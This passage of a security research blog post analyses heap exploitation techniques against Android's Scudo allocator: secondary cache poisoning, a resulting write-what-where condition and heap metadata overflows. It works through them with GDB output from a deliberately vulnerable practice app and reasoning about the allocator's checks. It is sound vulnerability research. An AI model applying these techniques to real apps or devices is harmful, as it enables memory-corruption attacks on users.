&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> i r rdi
rdi &lt;span style="color:#ae81ff">0x80000&lt;/span> &lt;span style="color:#ae81ff">0x80000&lt;/span>
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ni
...
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> i r rax
rax &lt;span style="color:#ae81ff">0x7babf2940830&lt;/span> &lt;span style="color:#ae81ff">0x7babf2940830&lt;/span>
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> x&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>gx &lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>rax&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x40&lt;/span>
&lt;span style="color:#ae81ff">0x7babf29407f0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0x00007bac40c76fc0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000000000&lt;/span>
&lt;span style="color:#ae81ff">0x7babf2940800&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0x00007babf29407f0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000080040&lt;/span>
&lt;span style="color:#ae81ff">0x7babf2940810&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>
&lt;span style="color:#ae81ff">0x7babf2940820&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0x216a000000000100&lt;/span> &lt;span style="color:#ae81ff">0x4242424242424242&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As can be seen from the fields &lt;code>LargeBlock::Header::MapBase = -1&lt;/code> and &lt;code>LargeBlock::Header::MapSize = -1&lt;/code>, we definitely get our chunk back. There cannot be any other chunk with such a chunk header, because this would imply that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=542;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>mmap&lt;/code>&lt;/a> returned &lt;code>-1&lt;/code>, which is not a valid user - space address on Android. Also observe that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=210;drc=b45a2ea782074944f79fc388df20b06e01f265f7">the last cached large chunk is retrieved first&lt;/a>. Hence, if we called &lt;code>malloc&lt;/code> next, then our fake chunk would be considered first!&lt;/p>
&lt;p>Still, there is something off:&lt;/p>
&lt;ol>
&lt;li>&lt;code>LargeBlock::Header::Prev = 0x00007bac40c76fc0&lt;/code>, which is not our chunk.&lt;/li>
&lt;li>&lt;code>LargeBlock::Header::Next = 0x0000000000000000&lt;/code>, so its the last element in &lt;code>InUseChunks&lt;/code>&lt;/li>
&lt;li>&lt;code>LargeBlock::Header::CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40&lt;/code>, where &lt;code>0x7babf29407b0&lt;/code> was the address of the large header before calling &lt;code>free&lt;/code>. But we can see that the &lt;code>CommitBase&lt;/code> remained the same and also that the newly &amp;ldquo;allocated&amp;rdquo; chunk is now located at &lt;code>0x00007babf29407f0&lt;/code>, which is the &lt;code>CommitBase&lt;/code> value of our fake chunk (technically, this could be a coincidence, because &lt;code>0x7babf29407f0 = 0x7babf29407b0 + 0x40&lt;/code>, which is just shifted by the size of all header altogether including padding. The argument against that is that the secondary by itself should have no reason to return a chunk that is located on the stack, i.e. overlapping with our &lt;code>buffer&lt;/code>).&lt;/li>
&lt;/ol>
&lt;p>As is the case with &lt;a href="#primary-poisoning">primary poisoning&lt;/a>, the contents have not been cleared:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ x/4gx $rax
0x7babf2940830: 0x4242424242424242 0x4242424242424242
0x7babf2940840: 0x4242424242424242 0x4242424242424242
&lt;/code>&lt;/pre>&lt;p>which again allows for distinguishing fake chunk creation and preinitialization of memory. When attempting to preinitialize a data structure, we have to take the shift of &lt;code>0x40&lt;/code> into account (we will see why the shift is there later).&lt;/p>
&lt;h5 id="challenges">Challenges&lt;/h5>
&lt;p>Similar to &lt;a href="#primary-poisoning">primary poisoning&lt;/a>, there are some pitfalls with &lt;a href="#secondary-cache-poisoning">secondary cache poisoning&lt;/a>, which will be discussed in this section.&lt;/p>
&lt;h6 id="one-secondary-to-rule-em-all">One Secondary to rule &amp;lsquo;em all&lt;/h6>
&lt;p>Observe that when allocating memory from the secondary via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>malloc(&amp;lt;large size&amp;gt;)&lt;/code>&lt;/a>, there is only one instance of the secondary that actually handles these allocations (as opposed to the primary, which may &amp;ldquo;change&amp;rdquo; depending on the outcome of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>getTSDAndLock&lt;/code>&lt;/a>. Actually the primary itself does not change, but the cache that is based on the primary. I will use primary and a cache that comes from the primary interchangably, because the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=992;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>Primary&lt;/code>&lt;/a> is not used for any allocations directly).&lt;/p>
&lt;p>Considering the empirical observation that the &lt;em>damnvulnerableapp:VulnerableActivity&lt;/em> averages to roughly 20 threads per run, it is very likely that other threads will also use the secondary. One particular run shows 25 threads running in parallel:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ i threads
Id Target Id Frame
1 Thread 16516.16516 &amp;quot;nerableActivity&amp;quot; 0x00007baef80269aa in __epoll_pwait () from libc.so
6 Thread 16516.16521 &amp;quot;Signal Catcher&amp;quot; 0x00007baef80263ea in __rt_sigtimedwait () from libc.so
7 Thread 16516.16522 &amp;quot;perfetto_hprof_&amp;quot; 0x00007baef8025747 in read () from libc.so
8 Thread 16516.16523 &amp;quot;ADB-JDWP Connec&amp;quot; 0x00007baef8026aaa in __ppoll () from libc.so
9 Thread 16516.16524 &amp;quot;Jit thread pool&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
10 Thread 16516.16525 &amp;quot;HeapTaskDaemon&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
11 Thread 16516.16526 &amp;quot;ReferenceQueueD&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
12 Thread 16516.16527 &amp;quot;FinalizerDaemon&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
13 Thread 16516.16528 &amp;quot;FinalizerWatchd&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
14 Thread 16516.16529 &amp;quot;Binder:16516_1&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
15 Thread 16516.16530 &amp;quot;Binder:16516_2&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
16 Thread 16516.16533 &amp;quot;Binder:16516_3&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
17 Thread 16516.16538 &amp;quot;Profile Saver&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
18 Thread 16516.16539 &amp;quot;RenderThread&amp;quot; 0x00007baef80269aa in __epoll_pwait () from libc.so
19 Thread 16516.16542 &amp;quot;pool-2-thread-1&amp;quot; 0x00007baef8026aaa in __ppoll () from libc.so
20 Thread 16516.16544 &amp;quot;hwuiTask0&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
21 Thread 16516.16545 &amp;quot;hwuiTask1&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
22 Thread 16516.16546 &amp;quot;Binder:16516_3&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
23 Thread 16516.16547 &amp;quot;Thread-3&amp;quot; 0x00007baef802656a in recvfrom () from libc.so
* 24 Thread 16516.16548 &amp;quot;Thread-2&amp;quot; 0x00007babf33de9ec in Java_com_damnvulnerableapp_vulnerable_modules_SecondaryFakeModule_free () from libSecondaryFakeModule.so
25 Thread 16516.16562 &amp;quot;Binder:16516_4&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
&lt;/code>&lt;/pre>&lt;p>As with the &lt;a href="#thievish-threads">primary&lt;/a>, our fake chunk may be stolen by another thread, depending on the allocations performed.&lt;/p>
&lt;p>Another problem is that if the cache is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=202;drc=b45a2ea782074944f79fc388df20b06e01f265f7">full&lt;/a> and there are &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=203;drc=b45a2ea782074944f79fc388df20b06e01f265f7">not &amp;ldquo;enough&amp;rdquo; (4) allocations&lt;/a> happening to balance out the congestion of the cache, the cache will be &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=221;drc=b45a2ea782074944f79fc388df20b06e01f265f7">emptied&lt;/a>. This basically &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=357;drc=b45a2ea782074944f79fc388df20b06e01f265f7">invalidates all cache entries&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=364;drc=b45a2ea782074944f79fc388df20b06e01f265f7">unmaps&lt;/a> them. Having &lt;code>munmap&lt;/code> called on our fake chunk might seem problematic, but it turns out that running &lt;code>munmap(0x0, 0x1)&lt;/code> returns successfully&amp;hellip;Therefore, setting &lt;code>LargeBlock::Header::MapBase = 0&lt;/code> and &lt;code>LargeBlock::Header::MapSize = 1&lt;/code> at least prevents the app from aborting. Of course, having our fake cache entry stripped from the cache mitigates this attack.&lt;/p>
&lt;p>To conclude, &lt;strong>Secondary Cache Poisoning is probabilistic&lt;/strong> just like &lt;a href="#pitfalls-and-challenges">Primary Poisoning&lt;/a>!&lt;/p>
&lt;h6 id="shifted-user-data">Shifted User Data&lt;/h6>
&lt;p>Recall that our fake chunk returned from calling &lt;code>malloc&lt;/code> is located at &lt;code>fake.CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40&lt;/code>. Therefore, the user data starts at &lt;code>0x7babf29407b0 + 0x40 + 0x40 = 0x7babf2940830&lt;/code>, because of the headers and padding (see example above). At best, we want to show that &lt;code>malloc(size) = fake.CommitBase + 0x40&lt;/code>, because this would allow us to precisely control where the fake chunk is located. Observe that there seem to be no limitations on the position of a secondary chunk as opposed to &lt;a href="#fake-chunk-mispositioning">primary chunks&lt;/a>, because the &lt;code>LargeBlock::Header::CommitBase&lt;/code> is not compacted!&lt;/p>
&lt;p>Lets say we successfully called &lt;code>free(buffer + 0x40)&lt;/code> and therefore introduced our fake chunk into the secondary cache. Also, assume that the next call of our thread to &lt;code>malloc(fake.CommitSize - 0x40)&lt;/code> returns our fake chunk, if available in terms of size and pointer constraints (no other thread can steal it), and that &lt;code>0x10 | fake.CommitBase&lt;/code> and &lt;code>0x10 | fake.CommitSize&lt;/code> (i.e. everything is nicely aligned). We want to prove that these assumptions imply that &lt;code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40&lt;/code>.&lt;/p>
&lt;p>First, observe that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=145;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>MapAllocatorCache::store&lt;/code>&lt;/a> does not change &lt;code>fake.CommitBase&lt;/code> and &lt;code>fake.CommitSize&lt;/code>. To that end, notice that all accesses to &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=155;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Entry.CommitBase&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=156;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Entry.CommitSize&lt;/code>&lt;/a>, are by value and &lt;strong>not&lt;/strong> by reference. Thus, the actual cache entry will contain our chosen &lt;code>fake.CommitBase&lt;/code> and &lt;code>fake.CommitSize&lt;/code>.&lt;/p>
&lt;p>When allocating from the secondary cache, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=229;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>retrieve&lt;/code>&lt;/a> is called. Based on the assumption that &lt;code>malloc(fake.CommitSize - 0x40)&lt;/code> returns our fake chunk if available, we need to show that&lt;/p>
&lt;ol>
&lt;li>the sizes match, s.t. our fake chunk is actually part of the set of chunks that fit our allocation request. Then, by assumption, the fake chunk will be returned.&lt;/li>
&lt;li>the &lt;code>CommitBase&lt;/code> is somehow modified by a constant.&lt;/li>
&lt;/ol>
&lt;p>For the first point, observe that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>Secondary.deallocate&lt;/code>&lt;/a> is given the allocation size that is passed to &lt;code>malloc&lt;/code>. Therefore, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=514;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>MapAllocatorCache::retrieve&lt;/code>&lt;/a> is called with &lt;code>Size = fake.CommitSize - 0x40&lt;/code>. We also know that &lt;code>fake_entry.CommitSize = fake.CommitSize&lt;/code> (we will call the entry representing our fake chunk &lt;code>fake_entry&lt;/code>). Hence &lt;code>CommitBase := fake_entry.CommitBase&lt;/code> and &lt;code>CommitSize := fake_entry.CommitSize&lt;/code>. Then it has to hold that&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=249;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>HeaderPos &amp;gt; CommitBase + CommitSize&lt;/code>&lt;/a>. This is computed in the following:
&lt;pre tabindex="0">&lt;code>AllocPos = roundDownTo(CommitBase + CommitSize - Size, Alignment)
= roundDownTo(CommitBase + CommitSize - (fake.CommitSize - 0x40), Alignment)
= roundDownTo(CommitBase + CommitSize - (CommitSize - 0x40), Alignment)
= roundDownTo(CommitBase + 0x40), Alignment) &amp;lt;-- assumption on 0x10 divides CommitBase
= CommitBase + 0x40
HeaderPos = AllocPos - Chunk::getHeaderSize() - LargeBlock::getHeaderSize();
= (CommitBase + 0x40) - 0x10 - 0x30
= CommitBase
&lt;/code>&lt;/pre>Therefore, we check whether &lt;code>CommitBase &amp;gt; CommitBase + CommitSize &amp;lt;=&amp;gt; 0 &amp;gt; CommitSize&lt;/code>, which is impossible, as &lt;code>CommitSize&lt;/code> is of type &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/internal_defs.h;l=81;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>uptr = uintptr_t&lt;/code>&lt;/a>. To be precise, an unsigned comparison will be performed, i.e. for &lt;code>r13 = AllocPos&lt;/code> and &lt;code>rsi = CommitBase + CommitSize&lt;/code>:
&lt;pre tabindex="0">&lt;code>0x00007baef7fc0dc6 &amp;lt;+182&amp;gt;: add r13,0xffffffffffffffc0 // HeaderPos = AllocPos - 0x40
0x00007baef7fc0dca &amp;lt;+186&amp;gt;: cmp r13,rsi // CommitBase - (CommitBase + CommitSize) = -CommitSize
0x00007baef7fc0dcd &amp;lt;+189&amp;gt;: ja 0x7baef7fc0d80 // jump if CF=0 and ZF=0; we DONT want to jump here
&lt;/code>&lt;/pre>For the above, &lt;code>CF=1&lt;/code> as mathematically &lt;code>CommitSize &amp;gt;= 0&lt;/code>. Hence, the fake chunk passes the first check.&lt;/li>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=251;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>HeaderPos &amp;lt; CommitBase || AllocPos &amp;gt; CommitBase + PageSize * MaxUnusedCachePages&lt;/code>&lt;/a>:
&lt;ol>
&lt;li>&lt;code>HeaderPos &amp;lt; CommitBase &amp;lt;=&amp;gt; CommitBase &amp;lt; CommitBase&lt;/code> is trivially false.&lt;/li>
&lt;li>The second condition requires a bit more math:
&lt;pre tabindex="0">&lt;code> AllocPos = CommitBase + 0x40
&amp;gt; CommitBase + PageSize * MaxUnusedCachePages
&amp;lt;=&amp;gt; 0x40 &amp;gt; 0x1000 * 4
&lt;/code>&lt;/pre>which is trivially false.&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>From now on we may assume that the fake chunk passed all the above tests, which implies that we reach the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7">assignment phase&lt;/a>. Luckily, this phase does not modify &lt;code>fake_entry.CommitBase&lt;/code> and &lt;code>fake_entry.CommitSize&lt;/code> at all. Notice that the pointer to the header that &lt;code>MapAllocatorCache::retrieve&lt;/code> returns is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>HeaderPos&lt;/code>&lt;/a>, i.e. &lt;code>CommitBase&lt;/code>.&lt;/p>
&lt;p>Finally, the user data pointer will be computed &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=515;drc=b45a2ea782074944f79fc388df20b06e01f265f7">here&lt;/a> (extremely simplified):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">return&lt;/span> H &lt;span style="color:#f92672">+&lt;/span> LargeBlock&lt;span style="color:#f92672">::&lt;/span>getHeaderSize(); &lt;span style="color:#75715e">// = fake.CommitBase + 0x30
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is then used to compute the final user pointer &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=379">&lt;code>Ptr = fake.CommitBase + 0x30 + 0x10&lt;/code>&lt;/a> (again extremely simplified, but this is what actually happens when resolving alignment etc.).&lt;/p>
&lt;p>Therefore, &lt;code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40&lt;/code> (btw. this is totally a &lt;a href="#neat-little-side-effect">&lt;em>Write - What - Where&lt;/em> condition&lt;/a>).&lt;/p>
&lt;h5 id="neat-little-side-effect">Neat Little Side Effect&lt;/h5>
&lt;p>The attentive reader might have noticed that the previous proof, dispite being a mathematical disaster, implies that an attacker can control where the chunk is returned to by setting &lt;code>fake.CommitBase&lt;/code> accordingly.&lt;/p>
&lt;p>Theoretically speaking, let &lt;code>target_addr&lt;/code> be the address we want to write data to. Also, we assume that the cache is not emptied. If the cache is emptied while the fake chunk is cached, &lt;code>munmap&lt;/code> will either return an error, which in turn results in an abort, or will unmap a region that is in use, therefore eventually causing a segmentation fault. Thus, the probability of the following attack to succeed decreases with increasing amount of bytes to write!&lt;/p>
&lt;p>From &lt;code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40&lt;/code> we get that the &lt;code>LargeBlock::Header&lt;/code> is stored at a chosen &lt;code>fake.CommitBase&lt;/code>. As we cannot control the contents of &lt;code>fake.Prev&lt;/code> and &lt;code>fake.Next&lt;/code>, because they will be overwritten, we have to stick with &lt;code>fake.MapBase&lt;/code> and &lt;code>fake.MapSize&lt;/code>. It should also be possible to use the &lt;code>fake.CommitSize&lt;/code> field, but we will ignore it for now, because it will be modified by a &lt;code>+ 0x40&lt;/code>, which has to be considered when calling &lt;code>free&lt;/code> in order to bypass the checks.&lt;/p>
&lt;p>Now, choosing &lt;code>fake.CommitBase = target_addr + offset(LargeBlock::Header::MapBase) = target_addr + 0x20&lt;/code> results in a 16 byte write at &lt;code>target_addr&lt;/code>. Of course this is limited by the fact that a thread allocating enough memory to trigger the secondary will try to use the allocated memory (otherwise, why would a thread allocate memory at all?). Therefore, this &lt;em>Write - What - Where&lt;/em> condition is constrained by the fact that whereever we write, consecutive memory is most likely overwritten by the allocating thread.&lt;/p>
&lt;h3 id="heap---based-meta-data-overflow">Heap - based Meta Data Overflow&lt;/h3>
&lt;p>Up to this point, we have only seen fake chunk creation for &lt;a href="#primary-poisoning">primary&lt;/a> and &lt;a href="#secondary-cache-poisoning">secondary&lt;/a> and a small &lt;a href="#neat-little-side-effect">&lt;em>Write - What - Where&lt;/em> condition&lt;/a>. Now one might ask: What if there is a buffer overflow into a consecutive chunk?&lt;/p>
&lt;p>First, lets agree on focussing on primary allocations. The reason is that secondary allocations will initially be performed via &lt;code>mmap&lt;/code> and therefore include a portion of randomness as regards their addresses. Of course, the primary also utilizes randomness to especially make heap - based overflows harder. I.e. the primary &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=388;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">shuffles&lt;/a> the chunks w.r.t. a class id. This means that for some index &lt;code>i&lt;/code> we get that with high probability &lt;code>malloc_i(size) != malloc_i+1(size) - (header_size + padding + size) = malloc_i+1(size) - 0x20&lt;/code>.&lt;/p>
&lt;p>This leaves us with either trying to attack the randomness (e.g. via side channel attacks) or creating two consecutive fake chunks with the property that one chunk can overflow into the other chunk. As attacks on randomness are pretty hard (i.e. mathematical) this will be postponed and tagged as &lt;a href="#future-work">future work&lt;/a>.&lt;/p>
&lt;p>Lets assume that we introduced two fake chunks, named &lt;code>first&lt;/code> and &lt;code>second&lt;/code>, with the following properties:&lt;/p>
&lt;ol>
&lt;li>the fake chunks are of the same size (primary)&lt;/li>
&lt;li>there exists an index &lt;code>i&lt;/code> s.t. &lt;code>C-&amp;gt;Chunks[i] = first&lt;/code> and &lt;code>C-&amp;gt;Chunks[i+1] = second&lt;/code>&lt;/li>
&lt;li>there is no interference by other threads&lt;/li>
&lt;li>&lt;code>first&lt;/code> and &lt;code>second&lt;/code> are successive in memory, i.e. &lt;code>addr(first) + 0x20 = addr(second)&lt;/code>&lt;/li>
&lt;li>there exists functionality in the target app that will allocate both chunks, trigger a buffer overflow from &lt;code>first&lt;/code> into &lt;code>second&lt;/code>, and &lt;code>second&lt;/code> contains &amp;ldquo;important&amp;rdquo; information&lt;/li>
&lt;/ol>
&lt;p>To be precise, it only really matters that property 5 is given, i.e. we technically do not need property 2. Although the problem that arises is that the functionality that triggers the overflow will have to perform a certain (maybe random) amount of allocations after allocating &lt;code>first&lt;/code> until it allocates &lt;code>second&lt;/code>, therefore decreasing success probability. Determining the amount of allocations could require restarting the app over and over again with increasing number of allocations, or in the worst case boil down to guessing.&lt;/p>
&lt;p>Assuming the above properties, the remaining issue is that overwriting meta data of &lt;code>second&lt;/code> in &lt;em>Scudo&lt;/em> will abort the app if &lt;code>free(second)&lt;/code> is called and there is a checksum mismatch. Therefore, we need to know the pointer of &lt;code>second&lt;/code> and &lt;strong>a&lt;/strong> value for &lt;code>Cookie&lt;/code> in order to properly compute the checksum. If, however, the goal is to get the overflow into &amp;ldquo;important&amp;rdquo; user data (which might even allow to overwrite the &lt;code>.got&lt;/code> entry of &lt;code>free&lt;/code>), then an attacker will be allowed to overflow with the above assumptions.&lt;/p>
&lt;h2 id="future-work">Future Work&lt;/h2>
&lt;p>In this section, unanswered questions and unsolved problems are listed for future work! Either they seemed to hard at first glance or were considered &amp;ldquo;useless&amp;rdquo; at that point in time.&lt;/p>
&lt;ol>
&lt;li>Evaluate integer underflow in &lt;a href="#fake-chunk-mispositioning">primary poisoning&lt;/a>. It somehow feels like there has to be more that can be done&amp;hellip;&lt;/li>
&lt;li>Evaluate &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1116;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>getBlockBegin&lt;/code>&lt;/a>. To be precise: how can the &lt;code>Offset&lt;/code> field be used? Memory probing??&lt;/li>
&lt;li>Attack: Primary fake chunk creation to construct predictable order and locations of primary chunks. I.e. calling &lt;code>free&lt;/code> repeatedly for consecutive memory allows to fill up &lt;code>C-&amp;gt;Chunks&lt;/code> in non - shuffled fashion! Problem: strong assumptions&lt;/li>
&lt;li>Evaluate integer underflow caused by calling &lt;code>DoublyLinkedList::remove&lt;/code> with &lt;code>X-&amp;gt;Next = X-&amp;gt;Prev = X&lt;/code>. Maybe side channel?? (very unlikely, but would be funny). &lt;code>DoublyLinkedList::Size&lt;/code> impacts &lt;code>DoublyLinkedList::empty()&lt;/code>, which impacts &lt;code>scudo_malloc_info&lt;/code>. Might be useful to confuse programs&amp;hellip;&lt;/li>
&lt;li>What happens if the quarantine and memory tagging are enabled? How does that impact the proposed attacks?&lt;/li>
&lt;li>It seems to be possible to render the secondary cache useless by freeing fake chunks with &lt;code>CommitSize = &amp;lt;size smaller than primary sizes&amp;gt;&lt;/code> and &lt;code>CommitBase != nullptr&lt;/code>, as we &lt;strong>dont&lt;/strong> have control over the &lt;code>ClassId&lt;/code> field for &lt;code>scudo_malloc&lt;/code> calls. This could enforce secondary allocations to use &lt;code>mmap&lt;/code> and &lt;code>munmap&lt;/code>. This might be limited by the fact that the cache can be emptied if it is full.&lt;/li>
&lt;li>Evaluate attacks on randomness as regards chunk ordering in the primary. It suffices to know that two chunks in a chunk array are consecutive in terms of array positioning and memory location. Dissolving the entire shuffling of a chunks array would be amazing, but way too much. If we knew that the next to calls to &lt;code>malloc&lt;/code> result in two successive chunks in terms of memory location, then we could trigger a behaviour that again triggers a buffer overflow w.r.t. the two chunks. If we only had an oracle that tells us whether the next two calls to &lt;code>malloc&lt;/code> return successive chunks in memory, then we could test for this property and if its not given, then perform a (maybe random) sequence of &lt;code>malloc&lt;/code> and &lt;code>free&lt;/code> calls to &amp;ldquo;shuffle&amp;rdquo; the array. Then repeat.&lt;/li>
&lt;/ol>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>We have seen different kinds of attacks on vulnerabilities that involve &lt;em>Scudo&lt;/em>. To be precise, we have seen two types of fake chunk creation, namely &lt;a href="#primary-poisoning">&lt;em>Primary Poisoning&lt;/em>&lt;/a> and &lt;a href="#secondary-cache-poisoning">&lt;em>Secondary Cache Poisoning&lt;/em>&lt;/a>, as well as a &lt;a href="#neat-little-side-effect">&lt;em>Write - What - Where&lt;/em> condition&lt;/a>, which was a side effect of &lt;em>Secondary Cache Poisoning&lt;/em>. Finally, heap overflows into chunk meta data have been discussed.&lt;/p>
&lt;p>Overall, we can say that with strong enough assumptions, i.e. leak of a pointer and a combined header, and presence of a &lt;em>Scudo&lt;/em> - related vulnerability, we can perform similar attacks to those applicable to e.g. &lt;em>dlmalloc&lt;/em>. Currently, the main assumption is the leak in order to break the checksum. Further analysis is required to determine whether this leak is a globally minimal assumption, or whether the assumption can be dropped or replaced by a weaker one.&lt;/p></content></item></channel></rss>